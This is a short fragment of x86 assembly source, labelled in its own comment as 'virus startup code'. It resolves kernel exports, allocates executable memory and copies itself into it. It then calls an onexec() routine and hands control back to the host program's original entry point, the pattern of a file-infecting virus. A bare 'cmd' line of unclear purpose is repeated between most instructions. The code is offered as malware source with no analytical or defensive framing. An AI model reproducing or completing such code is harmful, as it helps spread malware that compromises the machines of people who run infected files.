   ; virus startup code
   ; calls onexec() subroutine

   MEM_COMMIT              equ     00001000h
   MEM_RESERVE             equ     00002000h
   PAGE_EXECUTE_READWRITE  equ     00000040h

   cmd
   init:
   cmd
                           pusha
   cmd
   vir_start_opcode:       mov     ebp, 12345678h
   cmd
                           seh_init
   cmd

                           call    get_kernel_export_base
   cmd
                           mov_h   edi, VirtualAlloc
   cmd
                           call    findfunc
   cmd
                           jz      __error
   cmd

                           push    PAGE_EXECUTE_READWRITE
   cmd
                           push    MEM_RESERVE+MEM_COMMIT
   cmd
                           push    DATASIZE+DATA_RVA
   cmd
                           push    offset start-DATA_RVA
   cmd
                           call    eax
   cmd
                           or      eax, eax
   cmd
                           jz      __error
   cmd

                           mov     esi, ebp
   cmd
                           lea     edi, start
   cmd
                           mov     ecx, CODESIZE
   cmd
                           cld
   cmd
                           rep     movsb
   cmd
                           push    offset __newloc
   cmd
                           ret
   cmd
   __newloc:
   cmd

                           call    init_win32api
   cmd
                           jz      __error
   cmd

                           call    randomize
   cmd

                           call    onexec
   cmd

   __error:                seh_done
   cmd

                           popa
   cmd

   old_eip_opcode:         mov     eax, 12345678h

   cmd
                           push    eax
   cmd
                           ret
   cmd
